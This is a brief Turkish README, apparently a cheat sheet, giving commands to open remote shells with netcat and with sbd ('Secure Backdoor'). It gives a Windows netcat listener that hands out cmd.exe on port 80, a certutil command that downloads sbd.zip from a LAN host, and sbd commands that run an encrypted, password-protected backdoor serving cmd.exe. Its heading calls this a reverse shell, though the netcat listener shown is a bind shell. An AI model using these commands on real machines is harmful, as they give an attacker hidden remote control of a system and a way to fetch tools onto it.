# netcat_sbd
# NETCAT İLE REVERSE SHELL 
Kali Linux : netcat -vvn <ip> <port> <br>
Windows  : netcat.exe -lvp 80 -e cmd.exe

Netcat herhangi bir şifreleme ve IP kısıtlaması gibi bir işlem yapmadığı için tehlikelidir
Bu yüzden netcat'in ssl ve ip kısıtlaması kullanılamalıdır

# SBD (Secure Backdoor)
Şifrel SSL backdooru ve -k parametresi ile şifre verme.

Dosya aktarma certutil.exe --urlcache -f http://192.168.1.100:8000/sbd.zip sbd.zip

Windows :sbd.exe -lvp 80 -k azat -e cmd.exe
Linux      :sbd -vnn 192.168.1.106 80 -k azat 
